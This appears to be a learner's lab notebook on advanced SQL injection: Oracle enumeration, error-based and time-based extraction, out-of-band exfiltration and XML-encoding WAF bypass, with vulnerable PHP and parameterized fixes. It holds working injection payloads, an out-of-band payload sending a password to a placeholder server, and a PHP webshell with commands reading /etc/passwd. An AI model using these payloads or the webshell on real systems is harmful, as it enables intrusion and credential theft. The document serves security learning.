# Day 18 Notes — Advanced SQLi: Oracle Enumeration, Visible Error-Based, Time-Based, and WAF Bypass

**Date:** May 1, 2026

---

## 1. What We Did Today Overview

- Completed Oracle-specific database enumeration using `all_tables` and `all_tab_columns` instead of `information_schema`
- Exploited visible error-based SQLi where the database error message itself leaked credentials — discovered independently that removing the TrackingId value freed up character space to see full error output
- Confirmed time-based blind SQLi using `pg_sleep(10)` on PostgreSQL and extracted full password using Burp Intruder
- Read through the out-of-band SQLi labs — understood the concept and why Burp Collaborator is required
- Read through the XML encoding WAF bypass lab — understood how XML entity encoding evades WAF keyword detection
- Zero hints used on any lab

---

## 2. The Foundation — Why These Vulnerabilities Exist

### Part A — Root Cause

Every vulnerability covered today shares the same root cause as all SQLi — the developer built a system that trusts user input and passes it directly into a SQL query without separating data from instructions. But today's labs reveal a deeper layer of that mistake: **developers also assume that hiding output makes injection unexploitable.**

The visible error-based lab exists because a developer forgot to suppress database error messages in production. The time-based lab exists because a developer thought "if nothing is returned, nothing can be extracted." The WAF bypass lab exists because a developer added a WAF and thought the problem was solved without understanding that WAFs operate on pattern matching, not semantic understanding.

Each of these is the same root mistake viewed from a different angle — insufficient understanding of what an attacker can do with any channel of information, not just direct output.

### Part B — The Mental Model

Imagine you are locked in a room and need to find out what is written on a piece of paper on the other side of a closed door. In normal SQLi the door is open and you can read it directly. In blind SQLi someone tells you "yes" or "no" through the door based on your questions. In time-based SQLi they only knock once if the answer is yes and stay silent if it is no — you measure the delay between asking and hearing the knock. In visible error-based SQLi they accidentally read the paper out loud while telling you it is none of your business. In WAF bypass SQLi there is a guard checking for suspicious questions — but if you ask in a language the guard does not understand, the person behind the door still understands you perfectly.

The attacker's job is to find any channel — behavioral, temporal, or error-based — that leaks information.

### Part C — Three Conditions Required

For any of today's techniques to be exploitable three things must be true:

First, user input must reach a SQL query without being properly parameterized — the same prerequisite as all SQLi.

Second, there must be at least one observable channel back to the attacker — a page behavior, an error message, a response time difference, or an outbound network request. Without any channel, extraction is impossible.

Third, the attacker must be able to make enough requests to extract data iteratively — rate limiting or account lockout can prevent time-based and character-by-character extraction even when the vulnerability exists.

### Part D — What It Can and Cannot Do

These techniques **can** extract any data the database user has access to — credentials, emails, tokens, personal information. They **can** confirm the presence of specific users, tables, and columns without direct output. Time-based injection **can** work even when the application is completely hardened against output and errors.

These techniques **cannot** write data to the database on their own — that requires a different class of payload. They **cannot** bypass network-level controls like firewalls that block outbound connections — relevant for out-of-band techniques. Visible error-based injection **cannot** work if the application correctly suppresses all database errors before they reach the HTTP response.

---

## 3. Lab 1 — Oracle Database Contents Listing

### Setup

Shopping site with SQLi in the category filter parameter. Database is Oracle. Goal is to enumerate tables and columns without `information_schema` — which does not exist in Oracle — and extract administrator credentials.

### Payloads and Responses

**Step 1 — Confirm column count:**
```sql
' ORDER BY 2--
```
No error on ORDER BY 2. Error on ORDER BY 3. Two columns confirmed.

**Step 2 — Confirm both columns accept text:**
```sql
' UNION SELECT 'a','a' FROM dual--
```
Both positions displayed `a` on the page. Both columns accept text. `FROM dual` required because Oracle mandates a FROM clause in every SELECT statement.

**Step 3 — Dump all table names using Oracle metadata:**
```sql
' UNION SELECT table_name,'a' FROM all_tables--
```
Response contained: `USERS_FBSACC`

**Step 4 — Dump column names using Oracle metadata:**
```sql
' UNION SELECT column_name,'a' FROM all_tab_columns WHERE table_name='USERS_FBSACC'--
```
Response contained: `EMAIL`, `PASSWORD_CUEPJH`, `USERNAME_QOQOQJ`

**Step 5 — Extract credentials:**
```sql
' UNION SELECT USERNAME_QOQOQJ,PASSWORD_CUEPJH FROM USERS_FBSACC--
```
Response: `administrator:z65hvki7xs3hfytinpkg`

### Why It Worked — Technical Explanation

The vulnerable backend query on Oracle looks like this:

```sql
SELECT name, description FROM products WHERE category = '[INPUT]'
```

After injection the database receives:

```sql
SELECT name, description FROM products WHERE category = ''
UNION SELECT USERNAME_QOQOQJ,PASSWORD_CUEPJH FROM USERS_FBSACC--'
```

The UNION appends a second result set. The application renders both — product data and injected credential data — in the same output location.

**The critical Oracle-specific detail — `all_tab_columns` not `all_columns`:**

Oracle does not have `information_schema`. It has its own metadata views:

| What you want | PostgreSQL / MySQL | Oracle |
|---|---|---|
| List all tables | `information_schema.tables` | `all_tables` |
| List all columns | `information_schema.columns` | `all_tab_columns` |
| Column holding table name | `table_name` | `table_name` |
| Column holding column name | `column_name` | `column_name` |

`all_tab_columns` is the correct Oracle view. `all_columns` does not exist in Oracle — using it returns an error. This is a common mistake when switching from PostgreSQL labs to Oracle labs.

### What This Proves

Oracle databases are fully enumerable through SQLi using the same logical chain as PostgreSQL — only the metadata table names differ. Database fingerprinting done on Day 16 is what tells you which set of metadata tables to use.

---

## 4. Lab 2 — Visible Error-Based SQL Injection

### Setup

Shopping site with SQLi in the TrackingId cookie. The application prints raw database error messages directly on the page. No UNION output — the error message itself is the exfiltration channel. Database is PostgreSQL.

### The Key Discovery — Character Limit Truncation

When using the full TrackingId value the payload was being truncated in the error message:

```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking 
WHERE id = '0RsWhaWdGw4Ig1TO' AND 1=CAST((SELECT username FROM users LIM'
```

The error message cut off at `LIM` — the query was too long to display fully. The fix was to remove the original TrackingId value entirely, leaving the cookie as:

```
Cookie: TrackingId= '[payload]'
```

This freed up character space so the full query appeared in the error message including the extracted value. This is a genuine real-world technique — response truncation hiding exfiltrated data is something you account for on real targets.

### Payloads and Responses

**Step 1 — Confirm injection:**
```sql
'
```
Response: `ERROR: argument of AND must be type boolean, not type integer Position: 63`

This error confirms two things simultaneously — the parameter is injectable, and the application is printing raw PostgreSQL error messages to the page.

**Step 2 — Extract username via type confusion error:**
```sql
Cookie: TrackingId= ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
Response:
```
ERROR: invalid input syntax for type integer: "administrator"
ERROR: invalid input syntax for type integer: "administrator"
```

**Step 3 — Extract password via type confusion error:**
```sql
Cookie: TrackingId= ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
Response:
```
ERROR: invalid input syntax for type integer: "y9yi95hhjoefot6u9b0q"
ERROR: invalid input syntax for type integer: "y9yi95hhjoefot6u9b0q"
```

**Credentials extracted:** `administrator:y9yi95hhjoefot6u9b0q`

### Why It Worked — Technical Explanation

The vulnerable backend query:

```sql
SELECT * FROM tracking WHERE id = '[TRACKINID_INPUT]'
```

After injection with the CAST payload the database receives:

```sql
SELECT * FROM tracking WHERE id = '' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--'
```

`CAST((SELECT password FROM users LIMIT 1) AS int)` does the following:

1. The subquery `SELECT password FROM users LIMIT 1` runs first and returns the string `y9yi95hhjoefot6u9b0q`
2. PostgreSQL then attempts to convert that string to an integer data type using `CAST(... AS int)`
3. `y9yi95hhjoefot6u9b0q` is not a valid integer — the cast fails
4. PostgreSQL throws an error: `invalid input syntax for type integer: "y9yi95hhjoefot6u9b0q"`
5. The application, which has error display enabled, prints this error directly to the HTTP response
6. The password appears verbatim inside the error message

The `1=` wrapper exists to satisfy PostgreSQL's type system inside the AND clause. The overall expression `1=CAST(...)` is expected to be boolean — but the CAST errors before that comparison ever evaluates.

`LIMIT 1` is mandatory. Without it the subquery could return multiple rows which causes a different error — `more than one row returned by a subquery used as an expression`. That error does not contain the data you want. LIMIT 1 ensures exactly one row is returned so the CAST fires with the value inside it.

### What This Proves

Error messages are a data exfiltration channel. An application that suppresses output but prints database errors is not blind — it is leaking through a different pipe. Production applications must suppress all raw database errors before they reach the HTTP response.

---

## 5. Lab 3 — Blind SQLi with Time Delays and Information Retrieval

### Setup

Shopping site with SQLi in the TrackingId cookie. No output, no behavioral difference, no visible errors. The only signal is response time. Database is PostgreSQL. Goal is to extract the administrator password using only timing as the true/false channel.

### Payloads and Responses

**Step 1 — Confirm time-based injection:**
```sql
'||pg_sleep(10)--
```
Response took 10 seconds. Injection confirmed. Database confirmed as PostgreSQL — `pg_sleep()` is PostgreSQL specific.

**Breaking this down:**
- `'` closes the original string in the tracking query
- `||` is PostgreSQL string concatenation operator
- `pg_sleep(10)` is a PostgreSQL function that pauses database execution for 10 seconds
- `--` comments out the rest of the original query
- If the server takes 10 seconds to respond — the database executed your payload — injection confirmed

**Step 2 — Find password length:**
```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Decoded:
```sql
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Incremented until no delay. Password length confirmed at 20 characters.

**Step 3 — Extract password character by character using Intruder:**

Base payload:
```sql
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Intruder setup — Sniper attack:
- Payload position: the character `'a'` inside `='§a§'`
- Payload set: a-z and 0-9
- Detection: Response received column — requests taking 10+ seconds are the correct character
- Repeated for all 20 character positions by changing `SUBSTRING(password,1,1)` to `SUBSTRING(password,2,1)` through `SUBSTRING(password,20,1)`

**Password extracted:** `f34qj17u195eg5a4`

### Why It Worked — Technical Explanation

The vulnerable backend query:

```sql
SELECT * FROM tracking WHERE id = '[INPUT]'
```

After injection the database receives two statements — PostgreSQL supports stacked queries with `;`:

```sql
SELECT * FROM tracking WHERE id = '';
SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='f') 
THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--'
```

The second statement evaluates the condition. If the character matches — `pg_sleep(10)` executes — the database holds the connection open for 10 seconds before returning any response. The application cannot return an HTTP response until the database finishes — so the HTTP response itself is delayed by 10 seconds. Burp measures this delay in the response received column of Intruder results.

If the character does not match — `pg_sleep(0)` executes — no delay — immediate response. The timing difference between 10 seconds and under 1 second is unambiguous even on variable network connections.

### What This Proves

When an application leaks nothing — no output, no errors, no behavioral difference — response time is still a channel. Any function that introduces a conditional delay based on data values can exfiltrate that data one bit at a time.

---

## 6. Lab 4 and 5 — Out-of-Band SQLi (Concept)

These labs require Burp Collaborator — a Burp Suite Professional feature that provides a unique subdomain and logs all DNS and HTTP interactions that reach it. Community Edition does not include Collaborator. These labs were read through and understood — not executed.

### The Core Concept

Out-of-band SQLi is used when the application is completely hardened against all in-band channels — no output, no errors, no timing differences that can be measured reliably. Instead of extracting data through the HTTP response, you make the **database itself send the data to a server you control**.

On Oracle this is done using `UTL_HTTP` or XML external entity tricks that force the database to make outbound HTTP or DNS requests. The extracted data is embedded in the URL of that outbound request. You read it from your server logs.

Example Oracle out-of-band payload:
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SERVER/'||(SELECT password FROM users WHERE username='administrator')||'"> 
%remote;]>'),'/l') FROM dual--
```

The database constructs a URL containing the password and makes a DNS lookup or HTTP request to your server. The password travels outbound — you never see it in the application response at all.

**For future use:** `interactsh` by ProjectDiscovery is a free open-source alternative to Burp Collaborator. When bug bounty phase begins in Phase 4 — use interactsh for out-of-band detection and exfiltration.

---

## 7. Lab 6 — XML Encoding WAF Bypass (Read Through)

### The Core Concept

A WAF sits between the client and the application and scans incoming requests for SQLi keywords — `UNION`, `SELECT`, `FROM`, `WHERE`. If it sees these words it blocks the request before it reaches the application.

XML encoding converts each character into its XML entity equivalent. The character `S` becomes `&#83;` in decimal or `&#x53;` in hexadecimal. The WAF pattern matcher does not recognise `&#83;&#69;&#76;&#69;&#67;&#84;` as the word `SELECT` — it sees encoded characters and allows the request through.

The application receives the request, passes it through an XML parser which decodes the entities back to normal characters, and then passes `SELECT` to the database. The WAF never saw it. The database executes it normally.

### The Bypass Technique

A normal request body:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1 UNION SELECT username||'~'||password FROM users--</storeId>
</stockCheck>
```

WAF blocks this — sees `UNION SELECT`.

Encoded version:
```xml
<storeId>&#49; &#85;&#78;&#73;&#79;&#78; &#83;&#69;&#76;&#69;&#67;&#84; &#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;||'~'||&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100; &#70;&#82;&#79;&#77; &#117;&#115;&#101;&#114;&#115;--</storeId>
```

WAF allows this — sees XML entities. XML parser decodes it. Database receives and executes the SQL.

**Hackvertor extension in Burp** automates this encoding — right click payload in Repeater → Extensions → Hackvertor → Encode → `dec_entities`. This will be executed fully in a future session with the extension installed.

---

## 8. Vulnerable Source Code — Line by Line

This section covers the visible error-based lab as it has the most instructive vulnerable pattern.

```php
<?php
$tracking_id = $_COOKIE['TrackingId'];
$query = "SELECT * FROM tracking WHERE id = '$tracking_id'";
$result = pg_query($conn, $query);
if (!$result) {
    echo pg_last_error($conn);  // CRITICAL vulnerability
}
?>
```

**Line 2:** `$tracking_id = $_COOKIE['TrackingId']` — reads the cookie value directly with zero sanitization. The raw value from the browser becomes a PHP variable immediately. No type checking, no length checking, no character validation.

**Line 3:** `$query = "SELECT * FROM tracking WHERE id = '$tracking_id'"` — string concatenation builds the SQL query. The cookie value is dropped directly into the query string using single quotes. An attacker who closes that quote with their own `'` can inject arbitrary SQL after it.

**Line 5:** `if (!$result)` — checks if the query failed. This is correct error handling logic on its own.

**Line 6:** `echo pg_last_error($conn)` — this is the critical mistake. `pg_last_error()` retrieves the raw PostgreSQL error message and `echo` prints it directly to the HTTP response. The developer added this for debugging — probably to see what went wrong during development — and never removed it before deploying to production. This single line turns a blind vulnerability into a fully readable one.

**The fixed version:**

```php
<?php
// Use a parameterized query - input can never be interpreted as SQL
$query = "SELECT * FROM tracking WHERE id = $1";
$result = pg_query_params($conn, $query, array($_COOKIE['TrackingId']));

if (!$result) {
    // Log the error server-side only - never send to client
    error_log(pg_last_error($conn));
    // Send a generic message to the client
    echo "An error occurred. Please try again.";
}
?>
```

---

## 9. What Failed and Why

### Visible Error-Based Lab — Response Truncation

**What was attempted:** Full payload with original TrackingId value intact:
```
Cookie: TrackingId=0RsWhaWdGw4Ig1TO' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

**What happened:**
```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking 
WHERE id = '0RsWhaWdGw4Ig1TO' AND 1=CAST((SELECT username FROM users LIM'
```

The error message was truncated at position 95. The query was too long — the database error message has a character limit on what it displays. The payload was cut off before the CAST could complete and return the data value inside the error.

**Why it failed:** PostgreSQL error messages have a display length limit. When the full TrackingId value was included the total query string was long enough that the error message truncated before reaching the CAST result containing the credential.

**The fix discovered independently:** Remove the original TrackingId value entirely. The cookie becomes `TrackingId= '[payload]'`. The query is now shorter — the error message has room to display the full CAST result including the extracted credential.

**What this teaches:** On real targets, response truncation can hide exfiltrated data. Always check whether shortening the payload or removing surrounding context reveals more output. Maximum length of error messages, HTTP responses, and application output fields are all constraints to probe.

---

## 10. Chain Thinking

```
Visible Error-Based SQLi
        ↓
Credential Extraction via Error Message
        ↓
Admin Panel Access
        ↓
File Upload → Webshell → RCE
        ↓
Full Server Compromise
```

**Step by step attacker perspective:**

You find a parameter that throws visible database errors. You craft a CAST payload and the admin password appears in the error message. You log in to the admin panel. Inside the admin panel there is a file upload feature for profile images. You upload a PHP webshell disguised as an image — the same technique from Day 13. You execute commands on the server. You now have Remote Code Execution on a production machine.

**Severity upgrade:**

Visible error SQLi alone: High severity — credential exposure.
SQLi chained with file upload RCE: Critical — full server compromise, potential lateral movement to other internal systems.

**The chain in code:**

```sql
-- Step 1: Extract credentials via error
' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)--

-- Step 2: Log in as admin, find file upload
-- Step 3: Upload webshell (from Day 13)
```

```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

```
-- Step 4: Execute commands via webshell
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?cmd=cat+/etc/passwd
http://target.com/uploads/shell.php?cmd=whoami
```

A single misconfigured `echo pg_last_error()` in development code left in production combined with an unrestricted file upload turns a database read into full system access.

---

## 11. Real World Context

Visible error-based SQLi has appeared in numerous real bug bounty disclosures. Verbose database errors exposed in production are consistently found on HackerOne and Bugcrowd programs, particularly on older applications or internal tools promoted to external-facing status without proper hardening.

The WAF bypass via encoding is a technique that has been documented in real engagements against enterprise applications that invested heavily in WAF solutions as their primary SQLi defense. WAFs are not a substitute for parameterized queries — they are an additional layer. Attackers who understand encoding bypass WAFs routinely.

Bug bounty payout ranges on HackerOne for SQLi:
- Low impact blind SQLi with no sensitive data: $500–$2,000
- SQLi with credential extraction: $3,000–$10,000
- SQLi chained to RCE: $10,000–$30,000+

SQLi remains common despite being a solved problem because developers continue to use string concatenation to build queries, ORMs get misconfigured to allow raw query passthrough, and legacy codebases accumulate technical debt faster than security reviews can catch it.

---

## 12. The Fix

**The vulnerable pattern — string concatenation:**

```php
// VULNERABLE - input goes directly into query string
$query = "SELECT * FROM tracking WHERE id = '" . $_COOKIE['TrackingId'] . "'";
$result = pg_query($conn, $query);
echo pg_last_error($conn); // Never do this in production
```

**The fixed pattern — parameterized queries:**

```php
// SAFE - SQL structure compiled before input is ever provided
$query = "SELECT * FROM tracking WHERE id = $1";
$result = pg_query_params($conn, $query, array($_COOKIE['TrackingId']));

// Log errors server-side only
if (!$result) {
    error_log(pg_last_error($conn));
    http_response_code(500);
    exit("An error occurred.");
}
```

**Why parameterized queries work:** The SQL structure — `SELECT * FROM tracking WHERE id = $1` — is sent to PostgreSQL and compiled into an execution plan before any user input is provided. The `$1` is a typed placeholder. When the user input arrives it is treated as a data value to fill that slot — never as SQL syntax. No matter what characters the input contains — quotes, UNION keywords, CAST expressions — PostgreSQL treats the entire input as a string value. The SQL structure cannot be modified after compilation.

**Defense in depth — layers beyond parameterized queries:**

First, suppress all database error messages in production. Use `error_log()` to write errors to server logs only. Never `echo` or print database errors to HTTP responses — they reveal schema information, query structure, and database type.

Second, apply input validation as an additional layer. Cookie values used as tracking IDs should be UUIDs or fixed-length alphanumeric strings. Reject any value that does not match the expected format before it ever reaches the database layer.

Third, implement a WAF as an additional detection layer — not as a primary defense. A WAF catching SQLi patterns in requests provides alerting and logging even when parameterized queries would have blocked exploitation anyway.

Fourth, apply least privilege to database accounts. The account the application uses to query the tracking table should not have SELECT access to the users table. Proper database permission separation limits what an attacker can reach even when SQLi exists.

**What does NOT fix it:**

Escaping quotes with `pg_escape_string()` is not a reliable fix. While it handles common cases, encoding tricks and character set manipulation have historically bypassed escaping functions. Parameterization is the only reliable solution.

Removing error display while keeping string concatenation makes the vulnerability blind — not fixed. The injection still exists. The attacker switches to boolean or time-based techniques.

Adding a WAF without fixing the underlying concatenation is not a fix. WAF bypass via encoding — as covered in Lab 6 today — defeats keyword-matching WAFs without touching the actual vulnerability.

---

## 13. Key Concepts Summary

| Term | Meaning |
|---|---|
| Visible error-based SQLi | Injection where the database error message itself is printed on the page and used as the data exfiltration channel |
| CAST | SQL function that converts a value from one data type to another. Used to trigger type errors that reveal data |
| Type confusion error | Error thrown when you try to convert a non-numeric string to an integer — the string value appears in the error message |
| LIMIT 1 | SQL clause that restricts a query to return only one row — prevents multiple-row errors when using subqueries inside CAST |
| pg_sleep() | PostgreSQL function that pauses database execution for a specified number of seconds — used in time-based blind SQLi |
| Stacked queries | Running two SQL statements separated by a semicolon in a single injection — supported by PostgreSQL, not all databases |
| all_tables | Oracle's metadata view listing all tables the current user can access — Oracle's equivalent of information_schema.tables |
| all_tab_columns | Oracle's metadata view listing all columns in all tables — Oracle's equivalent of information_schema.columns |
| Out-of-band SQLi | Technique where the database itself makes an outbound network request to an attacker-controlled server carrying extracted data |
| Burp Collaborator | Burp Pro service that provides a unique domain and logs all DNS and HTTP interactions — used to receive out-of-band data |
| interactsh | Free open-source alternative to Burp Collaborator by ProjectDiscovery |
| WAF | Web Application Firewall — a layer that scans HTTP requests for attack patterns and blocks suspicious ones |
| XML entity encoding | Converting characters to their XML numeric equivalents like `&#83;` — used to obfuscate SQL keywords from WAF pattern matching |
| Response truncation | When error messages or output are cut off at a character limit — hiding exfiltrated data that extends beyond the limit |
| Parameterized query | A SQL query where structure is compiled first and user input is provided separately as typed data — prevents all SQLi |

---

## 14. Payloads and Commands Reference

```sql
-- ORACLE ENUMERATION

-- Column count
' ORDER BY 2--

-- Confirm text columns (Oracle requires FROM dual)
' UNION SELECT 'a','a' FROM dual--

-- Dump all table names (Oracle)
' UNION SELECT table_name,'a' FROM all_tables--

-- Dump column names for a specific table (Oracle)
' UNION SELECT column_name,'a' FROM all_tab_columns WHERE table_name='TARGET_TABLE'--

-- Extract credentials
' UNION SELECT USERNAME_COL,PASSWORD_COL FROM TARGET_TABLE--
```

```sql
-- VISIBLE ERROR-BASED SQLi (PostgreSQL)

-- Confirm injection and visible errors
'

-- Extract username via type confusion (remove TrackingId value to avoid truncation)
Cookie: TrackingId= ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

-- Extract password via type confusion
Cookie: TrackingId= ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

-- Target specific user
Cookie: TrackingId= ' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)--
```

```sql
-- TIME-BASED BLIND SQLi (PostgreSQL)

-- Confirm injection
'||pg_sleep(10)--

-- Confirm user exists with time signal
';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

-- Find password length
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

-- Extract character at position N
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,N,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

```sql
-- WAF BYPASS VIA XML ENTITY ENCODING (concept)
-- Normal payload (blocked by WAF):
1 UNION SELECT username||'~'||password FROM users--

-- Encoded equivalent (WAF bypassed):
-- Use Hackvertor extension in Burp: right click → Hackvertor → Encode → dec_entities
-- Or encode manually: U=&#85; N=&#78; I=&#73; O=&#79; N=&#78;
```

```
-- BURP INTRUDER — TIME-BASED CHARACTER EXTRACTION
Attack type: Sniper
Payload position: the character inside ='§a§'
Payload set: a-z, 0-9
Detection column: Response received (look for 10000ms+ delays)
Change SUBSTRING offset manually for each character position
```

---

## 15. Foundation Checklist

**Can you explain what causes visible error-based SQLi — not what it is but why it exists?**
It exists because a developer added database error display during development for debugging and never removed it before deploying to production. The injection itself exists because string concatenation builds the query. The visibility exists because `echo pg_last_error()` sends raw PostgreSQL errors to the HTTP response. Both mistakes must be present simultaneously.

**If you found a parameter that throws visible database errors on a live target, could you extract credentials without any tools — just a browser?**
Yes. Modify the cookie or parameter directly in browser developer tools. Inject `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`. Read the password from the error message on the page. No Burp required for basic visible error extraction.

**Can you explain to a developer in two minutes why suppressing errors is not the same as fixing the vulnerability?**
Suppressing errors removes the visible channel but the injection still executes. Switch to boolean based — inject `' AND 1=1--` vs `' AND 1=2--` and observe behavioral differences. Switch to time based — inject `'||pg_sleep(10)--` and measure delay. The vulnerability is the string concatenation. The channel is secondary. Fix the query, not the display.

**Can you describe two real scenarios where time-based SQLi would be the only option?**
First — an API endpoint that returns a fixed JSON response regardless of query results. No behavioral difference, no errors. Time delay is the only observable channel. Second — a logging endpoint that records data but never returns it to the client. The database executes the query but the response is always HTTP 200 with empty body. Time delay reveals execution.

**Can you chain today's techniques with a vulnerability from a previous day?**
Visible error SQLi extracts admin credentials. Admin access opens an admin panel with file upload functionality. File upload with Content-Type bypass from Day 13 uploads a PHP webshell. Webshell execution gives RCE. Credential extraction plus unrestricted file upload equals full server compromise.

**Can you explain why parameterized queries prevent SQLi and why escaping does not?**
Parameterized queries compile the SQL structure before user input is ever provided. The database receives the structure and the data separately — the data slot is typed and can never be reinterpreted as SQL syntax regardless of its contents. Escaping attempts to sanitize input after it is already being treated as part of the query string — character set edge cases, encoding tricks, and database-specific parsing behavior have historically bypassed escaping functions. Parameterization eliminates the problem at the architectural level. Escaping patches symptoms.

---
